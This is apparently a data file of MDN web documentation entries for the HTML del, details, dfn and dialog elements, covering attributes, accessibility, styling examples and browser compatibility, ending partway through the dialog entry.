  description: "# \\<del\\>: The Deleted Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdel&level=high)\n\nThe `<del>` [HTML](../index) element represents a range of text that has been deleted from a document. This can be used when rendering \"track changes\" or source code diff information, for example. The [`<ins>`](ins) element can be used for the opposite purpose: to indicate text that has been added to the document.\n\n## Try it\n\n#### HTML Demo: \\<del\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <blockquote>\n      There is <del>nothing</del> <ins>no code</ins> either good or bad, but <del>thinking</del> <ins>running it</ins> makes\n      it so.\n    </blockquote>\n\n    del {\n      text-decoration: line-through;\n      background-color: #fbb;\n      color: #555;\n    }\n\n    ins {\n      text-decoration: none;\n      background-color: #d4fcbc;\n    }\n\n    blockquote {\n      padding-left: 15px;\n      border-left: 3px solid #d7d7db;\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThis element is often (but need not be) rendered by applying a strike-through style to the text.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`cite`](#cite)  \nA URI for a resource that explains the change (for example, meeting minutes).\n\n[`datetime`](#datetime)  \nThis attribute indicates the time and date of the change and must be a valid date string with an optional time. If the value cannot be parsed as a date with an optional time string, the element does not have an associated timestamp. For the format of the string without a time, see [Date strings](../date_and_time_formats#date_strings). The format of the string if it includes both date and time is covered in [Local date and time strings](../date_and_time_formats#local_date_and_time_strings).\n\n## Accessibility\n\nThe presence of the `del` element is not announced by most screen reading technology in its default configuration. It can be made to be announced by using the CSS [`content`](https://developer.mozilla.org/en-US/docs/Web/CSS/content) property, along with the [`::before`](https://developer.mozilla.org/en-US/docs/Web/CSS/::before) and [`::after`](https://developer.mozilla.org/en-US/docs/Web/CSS/::after) pseudo-elements.\n\ncss\n\n```\ndel::before,\ndel::after {\n  clip-path: inset(100%);\n  clip: rect(1px, 1px, 1px, 1px);\n  height: 1px;\n  overflow: hidden;\n  position: absolute;\n  white-space: nowrap;\n  width: 1px;\n}\n\ndel::before {\n  content: \" [deletion start] \";\n}\n\ndel::after {\n  content: \" [deletion end] \";\n}\n```\n\nSome people who use screen readers deliberately disable announcing content that creates extra verbosity. Because of this, it is important to not abuse this technique and only apply it in situations where not knowing content has been deleted would adversely affect understanding.\n\n- [Short note on making your mark (more accessible) \\| The Paciello Group](https://www.tpgi.com/short-note-on-making-your-mark-more-accessible/)\n- [Tweaking Text Level Styles \\| Adrian Roselli](https://adrianroselli.com/2017/12/tweaking-text-level-styles.html)\n\n## Examples\n\nhtml\n\n```\n<p><del>This text has been deleted</del>, here is the rest of the paragraph.</p>\n<del><p>This paragraph has been deleted.</p></del>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                             |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Phrasing content](../content_categories#phrasing_content), [flow content](../content_categories#flow_content).                             |\n| Permitted content                           | [Transparent](../content_categories#transparent_content_model).                                                                             |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                       |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                        |\n| Implicit ARIA role                          | [`deletion`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                         |\n| DOM interface                               | [`HTMLModElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLModElement)                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `del`      | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `cite`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `datetime` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<ins>`](ins) element for insertions into a text\n- [`<s>`](s) element for strikethrough separate from representing deletion of text\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/del](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/del)"
- name: details
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<details\\>: The Details disclosure element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since January 2020.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdetails&level=high)\n\nThe `<details>` [HTML](../index) element creates a disclosure widget in which information is visible only when the widget is toggled into an \"open\" state. A summary or label must be provided using the [`<summary>`](summary) element.\n\nA disclosure widget is typically presented onscreen using a small triangle that rotates (or twists) to indicate open/closed status, with a label next to the triangle. The contents of the `<summary>` element are used as the label for the disclosure widget. The contents of the `<details>` provide the [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description) for the `<summary>`.\n\n## Try it\n\n#### HTML Demo: \\<details\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <details>\n      <summary>Details</summary>\n      Something small enough to escape casual notice.\n    </details>\n\n    details {\n      border: 1px solid #aaa;\n      border-radius: 4px;\n      padding: 0.5em 0.5em 0;\n    }\n\n    summary {\n      font-weight: bold;\n      margin: -0.5em -0.5em 0;\n      padding: 0.5em;\n    }\n\n    details[open] {\n      padding: 0.5em;\n    }\n\n    details[open] summary {\n      border-bottom: 1px solid #aaa;\n      margin-bottom: 0.5em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nA `<details>` widget can be in one of two states. The default *closed* state displays only the triangle and the label inside `<summary>` (or a [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent)-defined default string if no `<summary>`).\n\nWhen the user clicks on the widget or focuses it then presses the space bar, it \"twists\" open, revealing its contents. The common use of a triangle which rotates or twists around to represent opening or closing the widget is why these are sometimes called \"twisty\".\n\nYou can use CSS to style the disclosure widget, and you can programmatically open and close the widget by setting/removing its [`open`](#open) attribute. Unfortunately, at this time, there's no built-in way to animate the transition between open and closed.\n\nBy default when closed, the widget is only tall enough to display the disclosure triangle and summary. When open, it expands to display the details contained within.\n\nFully standards-compliant implementations automatically apply the CSS [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display)`: list-item` to the [`<summary>`](summary) element. You can use this to customize its appearance further. See [Customizing the disclosure widget](#customizing_the_disclosure_widget) for further details.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`open`](#open)  \nThis Boolean attribute indicates whether the details — that is, the contents of the `<details>` element — are currently visible. The details are shown when this attribute exists, or hidden when this attribute is absent. By default this attribute is absent which means the details are not visible.\n\n**Note:** You have to remove this attribute entirely to make the details hidden. `open=\"false\"` makes the details visible because this attribute is Boolean.\n\n[`name`](#name)  \nThis attribute enables multiple `<details>` elements to be connected, with only one open at a time. This allows developers to easily create UI features such as accordions without scripting.\n\nThe `name` attribute specifies a group name — give multiple `<details>` elements the same `name` value to group them. Only one of the grouped `<details>` elements can be open at a time — opening one will cause another to close. If multiple grouped `<details>` elements are given the `open` attribute, only the first one in the source order will be rendered open.\n\n**Note:** `<details>` elements don't have to be adjacent to one another in the source to be part of the same group.\n\n## Events\n\nIn addition to the usual events supported by HTML elements, the `<details>` element supports the [`toggle`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDetailsElement/toggle_event) event, which is dispatched to the `<details>` element whenever its state changes between open and closed. It is sent *after* the state is changed, although if the state changes multiple times before the browser can dispatch the event, the events are coalesced so that only one is sent.\n\nYou can use an event listener for the `toggle` event to detect when the widget changes state:\n\njs\n\n```\ndetails.addEventListener(\"toggle\", (event) => {\n  if (details.open) {\n    /* the element was toggled open */\n  } else {\n    /* the element was toggled closed */\n  }\n});\n```\n\n## Examples\n\n### A simple disclosure example\n\nThis example shows a simple `<details>` element with a `<summary>`.\n\nhtml\n\n```\n<details>\n  <summary>System Requirements</summary>\n  <p>\n    Requires a computer running an operating system. The computer must have some\n    memory and ideally some kind of long-term storage. An input device as well\n    as some form of output device is recommended.\n  </p>\n</details>\n```\n\n#### Result\n\n### Creating an open disclosure box\n\nTo start the `<details>` box in its open state, add the Boolean `open` attribute:\n\nhtml\n\n```\n<details open>\n  <summary>System Requirements</summary>\n  <p>\n    Requires a computer running an operating system. The computer must have some\n    memory and ideally some kind of long-term storage. An input device as well\n    as some form of output device is recommended.\n  </p>\n</details>\n```\n\n#### Result\n\n### Multiple named disclosure boxes\n\nWe include several `<details>` boxes, all with the same name so only one can be open at a time:\n\nhtml\n\n```\n<details name=\"reqs\">\n  <summary>Graduation Requirements</summary>\n  <p>\n    Requires 40 credits, including a passing grade in health, geography,\n    history, economics, and wood shop.\n  </p>\n</details>\n<details name=\"reqs\">\n  <summary>System Requirements</summary>\n  <p>\n    Requires a computer running an operating system. The computer must have some\n    memory and ideally some kind of long-term storage. An input device as well\n    as some form of output device is recommended.\n  </p>\n</details>\n<details name=\"reqs\">\n  <summary>Job Requirements</summary>\n  <p>\n    Requires knowledge of HTML, CSS, JavaScript, accessibility, web performance,\n    privacy, security, and internationalization, as well as a dislike of\n    broccoli.\n  </p>\n</details>\n```\n\n#### Result\n\nTry opening all the disclosure widgets. When you open one, all the others automatically close.\n\n### Customizing the appearance\n\nNow let's apply some CSS to customize the appearance of the disclosure box.\n\n#### CSS\n\ncss\n\n```\ndetails {\n  font:\n    16px \"Open Sans\",\n    Calibri,\n    sans-serif;\n  width: 620px;\n}\n\ndetails > summary {\n  padding: 2px 6px;\n  width: 15em;\n  background-color: #ddd;\n  border: none;\n  box-shadow: 3px 3px 4px black;\n  cursor: pointer;\n}\n\ndetails > p {\n  border-radius: 0 0 10px 10px;\n  background-color: #ddd;\n  padding: 2px 6px;\n  margin: 0;\n  box-shadow: 3px 3px 4px black;\n}\n\ndetails[open] > summary {\n  background-color: #ccf;\n}\n```\n\nThis CSS creates a look similar to a tabbed interface, where clicking the tab opens it to reveal its contents.\n\nThe selector `details[open]` can be used to style the element which is open.\n\n#### HTML\n\nhtml\n\n```\n<details>\n  <summary>System Requirements</summary>\n  <p>\n    Requires a computer running an operating system. The computer must have some\n    memory and ideally some kind of long-term storage. An input device as well\n    as some form of output device is recommended.\n  </p>\n</details>\n```\n\n#### Result\n\n### Customizing the disclosure widget\n\nThe disclosure triangle itself can be customized, although this is not as broadly supported. There are variations in how browsers support this customization due to experimental implementations as the element was standardized, so we'll have to use multiple approaches for a while.\n\nThe [`<summary>`](summary) element supports the [`list-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style) shorthand property and its longhand properties, such as [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type), to change the disclosure triangle to whatever you choose (usually with [`list-style-image`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-image)). For example, we can remove the disclosure widget icon by setting `list-style: none`.\n\n#### CSS\n\ncss\n\n```\ndetails {\n  font:\n    16px \"Open Sans\",\n    Calibri,\n    sans-serif;\n  width: 620px;\n}\n\ndetails > summary {\n  padding: 2px 6px;\n  width: 15em;\n  background-color: #ddd;\n  border: none;\n  box-shadow: 3px 3px 4px black;\n  cursor: pointer;\n  list-style: none;\n}\n\ndetails > p {\n  border-radius: 0 0 10px 10px;\n  background-color: #ddd;\n  padding: 2px 6px;\n  margin: 0;\n  box-shadow: 3px 3px 4px black;\n}\n```\n\nThis CSS creates a look similar to a tabbed interface, where activating the tab expands and opens it to reveal its contents.\n\n#### HTML\n\nhtml\n\n```\n<details>\n  <summary>System Requirements</summary>\n  <p>\n    Requires a computer running an operating system. The computer must have some\n    memory and ideally some kind of long-term storage. An input device as well\n    as some form of output device is recommended.\n  </p>\n</details>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                             |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), sectioning root, interactive content, palpable content. |\n| Permitted content                           | One [`<summary>`](summary) element followed by [flow content](../content_categories#flow_content).          |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                       |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                |\n| Implicit ARIA role                          | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role)                 |\n| Permitted ARIA roles                        | No `role` permitted                                                                                         |\n| DOM interface                               | [`HTMLDetailsElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDetailsElement)                 |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<summary>`](summary)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/details](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/details)"
- name: dfn
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<dfn\\>: The Definition element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdfn&level=high)\n\nThe `<dfn>` [HTML](../index) element indicates a term to be defined. The `<dfn>` element should be used in a complete definition statement, where the full definition of the term can be one of the following:\n\n- The ancestor paragraph (a block of text, sometimes marked by a [`<p>`](p) element)\n- The [`<dt>`](dt)/[`<dd>`](dd) pairing\n- The nearest [section](../content_categories#sectioning_content) ancestor of the `<dfn>` element,\n\n## Try it\n\n#### HTML Demo: \\<dfn\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>A <dfn id=\"def-validator\">validator</dfn> is a program that checks for syntax errors in code or documents.</p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    dfn {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\nThe [`title`](../global_attributes#title) attribute has special meaning, as noted below.\n\n## Usage notes\n\nThere are some not-entirely-obvious aspects to using the `<dfn>` element. We examine those here.\n\n### Specifying the term being defined\n\nThe term being defined is identified following these rules:\n\n1.  If the `<dfn>` element has a [`title`](../global_attributes#title) attribute, the value of the `title` attribute is considered to be the term being defined. The element must still have text within it, but that text may be an abbreviation (perhaps using [`<abbr>`](abbr)) or another form of the term.\n2.  If the `<dfn>` contains a single child element and does not have any text content of its own, and the child element is an [`<abbr>`](abbr) element with a `title` attribute itself, then the exact value of the `<abbr>` element's `title` is the term being defined.\n3.  Otherwise, the text content of the `<dfn>` element is the term being defined. This is shown [in the first example below](#basic_identification_of_a_term).\n\n**Note:** If the `<dfn>` element has a `title` attribute, it *must* contain the term being defined and no other text.\n\n### Links to `<dfn>` elements\n\nIf you include an [`id`](../global_attributes#id) attribute on the `<dfn>` element, you can then link to it using [`<a>`](a) elements. Such links should be uses of the term, with the intent being that the reader can quickly navigate to the term's definition if they're not already aware of it, by clicking on the term's link.\n\nThis is shown in the example under [Links to definitions](#links_to_definitions) below.\n\n## Examples\n\nLet's take a look at some examples of various usage scenarios.\n\n### Basic identification of a term\n\nThis example uses a plain `<dfn>` element to identify the location of a term within the definition.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  The <strong>HTML Definition element (<dfn>&lt;dfn&gt;</dfn>)</strong> is used\n  to indicate the term being defined within the context of a definition phrase\n  or sentence.\n</p>\n```\n\nSince the `<dfn>` element has no `title`, the text contents of the `<dfn>` element itself are used as the term being defined.\n\n#### Result\n\n### Links to definitions\n\nTo add links to the definitions, you create the link the same way you always do, with the [`<a>`](a) element.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  The\n  <strong>HTML Definition element (<dfn id=\"definition-dfn\">&lt;dfn&gt;</dfn>)</strong>\n  is used to indicate the term being defined within the context of a definition\n  phrase or sentence.\n</p>\n\n<p>\n  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Graece donan, Latine\n  voluptatem vocant. Confecta res esset. Duo Reges: constructio interrete.\n  Scrupulum, inquam, abeunti;\n</p>\n\n<p>\n  Because of all of that, we decided to use the\n  <code><a href=\"#definition-dfn\">&lt;dfn&gt;</a></code> element for this\n  project.\n</p>\n```\n\nHere we see the definition — now with an [`id`](../global_attributes#id) attribute, `\"definition-dfn\"`, which can be used as the target of a link. Later on, a link is created using `<a>` with the [`href`](a#href) attribute set to `\"#definition-dfn\"` to set up the link back to the definition.\n\n#### Result\n\n### Using abbreviations and definitions together\n\nIn some cases, you may wish to use an abbreviation for a term when defining it. This can be done by using the `<dfn>` and [`<abbr>`](abbr) elements in tandem, like this:\n\n#### HTML\n\nhtml\n\n```\n<p>\n  The <dfn><abbr title=\"Hubble Space Telescope\">HST</abbr></dfn> is among the\n  most productive scientific instruments ever constructed. It has been in orbit\n  for over 20 years, scanning the sky and returning data and photographs of\n  unprecedented quality and detail.\n</p>\n\n<p>\n  Indeed, the <abbr title=\"Hubble Space Telescope\">HST</abbr> has arguably done\n  more to advance science than any device ever built.\n</p>\n```\n\nNote the `<abbr>` element nested inside the `<dfn>`. The former establishes that the term is an abbreviation (\"HST\") and specifies the full term (\"Hubble Space Telescope\") in its `title` attribute. The latter indicates that the abbreviated term represents a term being defined.\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                             |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [palpable content](../content_categories#palpable_content). |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content), but no `<dfn>` element must be a descendant.                                                                    |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                       |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                        |\n| Implicit ARIA role                          | [`term`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/term_role)                                                                                   |\n| Permitted ARIA roles                        | Any                                                                                                                                                                         |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dfn` | 15      | 12   | 1       | 15    | 6      | 18             | 4                   | 14            | 6             | 1.0              | 4.4             |     |\n\n## See also\n\n- Elements related to definition lists: [`<dl>`](dl), [`<dt>`](dt), [`<dd>`](dd)\n- [`<abbr>`](abbr)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dfn](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dfn)"
- name: dialog
  summary: Since March 2022, this feature works across the latest devices and browser versions
  description: "# \\<dialog\\>: The Dialog element\n\n## Baseline 2022\n\nNewly available\n\nSince March 2022, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdialog&level=low)\n\nThe `<dialog>` [HTML](../index) element represents a modal or non-modal dialog box or other interactive component, such as a dismissible alert, inspector, or subwindow.\n\nThe HTML `<dialog>` element is used to create both modal and non-modal dialog boxes. Modal dialog boxes interrupt interaction with the rest of the page being inert, while non-modal dialog boxes allow interaction with the rest of the page.\n\nJavaScript should be used to display the `<dialog>` element. Use the [`.showModal()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/showModal) method to display a modal dialog and the [`.show()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/show) method to display a non-modal dialog. The dialog box can be closed using the [`.close()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close) method or using the [`dialog`](form#method) method when submitting a `<form>` that is nested within the `<dialog>` element. Modal dialogs can also be closed by pressing the Esc key.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n**Warning:** The `tabindex` attribute must not be used on the `<dialog>` element. See [usage notes](#usage_notes).\n\n[`open`](#open)  \nIndicates that the dialog box is active and is available for interaction. If the `open` attribute is not set, the dialog box will not be visible to the user. It is recommended to use the `.show()` or `.showModal()` method to render dialogs, rather than the `open` attribute. If a `<dialog>` is opened using the `open` attribute, it is non-modal.\n\n**Note:** While you can toggle between the open and closed states of non-modal dialog boxes by toggling the presence of the `open` attribute, this approach is not recommended.\n\n## Usage notes\n\n- HTML [`<form>`](form) elements can be used to close a dialog box if they have the attribute `method=\"dialog\"` or if the button used to submit the form has [`formmethod=\"dialog\"`](input#formmethod) set. When a `<form>` within a `<dialog>` is submitted via the `dialog` method, the dialog box closes, the states of the form controls are saved but not submitted, and the [`returnValue`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/returnValue) property gets set to the value of the button that was activated.\n- The CSS [`::backdrop`](https://developer.mozilla.org/en-US/docs/Web/CSS/::backdrop) pseudo-element can be used to style the backdrop of a modal dialog, which is displayed behind the `<dialog>` element when the dialog is displayed using the [`HTMLDialogElement.showModal()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/showModal) method. For example, this pseudo-element could be used to blur, darken, or otherwise obfuscate the inert content behind the modal dialog.\n- The [`autofocus`](../global_attributes/autofocus) attribute should be added to the element the user is expected to interact with immediately upon opening a modal dialog. If no other element involves more immediate interaction, it is recommended to add `autofocus` to the close button inside the dialog, or the dialog itself if the user is expected to click/activate it to dismiss.\n- Do not add the `tabindex` property to the `<dialog>` element as it is not interactive and does not receive focus. The dialog's contents, including the close button contained in the dialog, can receive focus and be interactive.\n\n## Accessibility\n\nWhen implementing a dialog, it is important to consider the most appropriate place to set user focus. When using [`HTMLDialogElement.showModal()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/showModal) to open a `<dialog>`, focus is set on the first nested focusable element. Explicitly indicating the initial focus placement by using the [`autofocus`](../global_attributes/autofocus) attribute will help ensure initial focus is set on the element deemed the best initial focus placement for any particular dialog. When in doubt, as it may not always be known where initial focus could be set within a dialog, particularly for instances where a dialog's content is dynamically rendered when invoked, the `<dialog>` element itself may provide the best initial focus placement.\n\nEnsure a mechanism is provided to allow users to close the dialog. The most robust way to ensure that all users can close the dialog is to include an explicit button to do so, such as a confirmation, cancellation, or close button.\n\nBy default, a dialog invoked by the `showModal()` method can be dismissed by pressing the Esc key. A non-modal dialog does not dismiss via the Esc key by default, and depending on what the non-modal dialog represents, it may not be desired for this behavior. Keyboard users expect the Esc key to close modal dialogs; ensure that this behavior is implemented and maintained. If multiple modal dialogs are open, pressing the Esc key should close only the last shown dialog. When using `<dialog>`, this behavior is provided by the browser.\n\nWhile dialogs can be created using other elements, the native `<dialog>` element provides usability and accessibility features that must be replicated if you use other elements for a similar purpose. If you're creating a custom dialog implementation, ensure that all expected default behaviors are supported and proper labeling recommendations are followed.\n\nThe `<dialog>` element is exposed by browsers in a manner similar to custom dialogs that use the ARIA [role=\"dialog\"](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/dialog_role) attribute. `<dialog>` elements invoked by the `showModal()` method implicitly have [aria-modal=\"true\"](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-modal), whereas `<dialog>` elements invoked by the `show()` method or displayed using the `open` attribute or by changing the default `display` of a `<dialog>` are exposed as `[aria-modal=\"false\"]`. When implementing modal dialogs, everything other than the `<dialog>` and its contents should be rendered inert using the [`inert`](../global_attributes/inert) attribute. When using `<dialog>` along with the `HTMLDialogElement.showModal()` method, this behavior is provided by the browser.\n\n## Examples\n\n### HTML-only dialog\n\nThis example demonstrates the creation of a non-modal dialog by using only HTML. Because of the boolean `open` attribute in the `<dialog>` element, the dialog appears open when the page loads. The dialog can be closed by clicking the \"OK\" button because the `method` attribute in the `<form>` element is set to `\"dialog\"`. In this case, no JavaScript is needed to close the form.\n\nhtml\n\n```\n<dialog open>\n  <p>Greetings, one and all!</p>\n  <form method=\"dialog\">\n    <button>OK</button>\n  </form>\n</dialog>\n```\n\n#### Result\n\n**Note:** Reload the page to reset the output.\n\nThis dialog is initially open because of the presence of the `open` attribute. Dialogs that are displayed using the `open` attribute are non-modal. After clicking \"OK\", the dialog gets dismissed, leaving the Result frame empty. When the dialog is dismissed, there is no method provided to reopen it. For this reason, the preferred method to display non-modal dialogs is by using the [`HTMLDialogElement.show()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/show) method. It is possible to toggle the display of the dialog by adding or removing the boolean `open` attribute, but it is not the recommended practice.\n\n### Creating a modal dialog\n\nThis example demonstrates a modal dialog with a [gradient](https://developer.mozilla.org/en-US/docs/Web/CSS/gradient) backdrop. The `.showModal()` method opens the modal dialog when the \"Show the dialog\" button is activated. The dialog can be closed by pressing the Esc key or via the `close()` method when the \"Close\" button within the dialog is activated.\n\nWhen a dialog opens, the browser, by default, gives focus to the first element that can be focused within the dialog. In this example, the [`autofocus`](../global_attributes/autofocus) attribute is applied to the \"Close\" button, giving it focus when the dialog opens, as this is the element we expect the user will interact with immediately after the dialog opens.\n\n#### HTML\n\nhtml\n\n```\n<dialog>\n  <button autofocus>Close</button>\n  <p>This modal dialog has a groovy backdrop!</p>\n</dialog>\n<button>Show the dialog</button>\n```\n\n#### CSS\n\nWe can style the backdrop of the dialog by using the [`::backdrop`](https://developer.mozilla.org/en-US/docs/Web/CSS/::backdrop) pseudo-element.\n\ncss\n\n```\n::backdrop {\n  background-image: linear-gradient(\n    45deg,\n    magenta,\n    rebeccapurple,\n    dodgerblue,\n    green\n  );\n  opacity: 0.75;\n}\n```\n\n#### JavaScript\n\nThe dialog is opened modally using the `.showModal()` method and closed using the `.close()` method.\n\njs\n\n```\nconst dialog = document.querySelector(\"dialog\");\nconst showButton = document.querySelector(\"dialog + button\");\nconst closeButton = document.querySelector(\"dialog button\");\n\n// \"Show the dialog\" button opens the dialog modally\nshowButton.addEventListener(\"click\", () => {\n  dialog.showModal();\n});\n\n// \"Close\" button closes the dialog\ncloseButton.addEventListener(\"click\", () => {\n  dialog.close();\n});\n```\n\n#### Result\n\nWhen the modal dialog is displayed, it appears above any other dialogs that might be present. Everything outside the modal dialog is inert and interactions outside the dialog are blocked. Notice that when the dialog is open, with the exception of the dialog itself, interaction with the document is not possible; the \"Show the dialog\" button is mostly obfuscated by the almost opaque backdrop of the dialog and is inert.\n\n### Handling the return value from the dialog\n\nThis example demonstrates the [`returnValue`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/returnValue) of the `<dialog>` element and how to close a modal dialog by using a form. By default, the `returnValue` is the empty string or the value of the button that submits the form within the `<dialog>` element, if there is one.\n\nThis example opens a modal dialog when the \"Show the dialog\" button is activated. The dialog contains a form with a [`<select>`](select) and two [`<button>`](button) elements, which default to `type=\"submit\"`. An event listener updates the value of the \"Confirm\" button when the select option changes. If the \"Confirm\" button is activated to close the dialog, the current value of the button is the return value. If the dialog is closed by pressing the \"Cancel\" button, the `returnValue` is `cancel`.\n\nWhen the dialog is closed, the return value is displayed under the \"Show the dialog\" button. If the dialog is closed by pressing the Esc key, the `returnValue` is not updated, and the `close` event doesn't occur, so the text in the [`<output>`](output) is not updated.\n\n#### HTML\n\nhtml\n\n```\n<!-- A modal dialog containing a form -->\n<dialog id=\"favDialog\">\n  <form>\n    <p>\n      <label>\n        Favorite animal:\n        <select>\n          <option value=\"default\">Choose…</option>\n          <option>Brine shrimp</option>\n          <option>Red panda</option>\n          <option>Spider monkey</option>\n        </select>\n      </label>\n    </p>\n    <div>\n      <button value=\"cancel\" formmethod=\"dialog\">Cancel</button>\n      <button id=\"confirmBtn\" value=\"default\">Confirm</button>\n    </div>\n  </form>\n</dialog>\n<p>\n  <button id=\"showDialog\">Show the 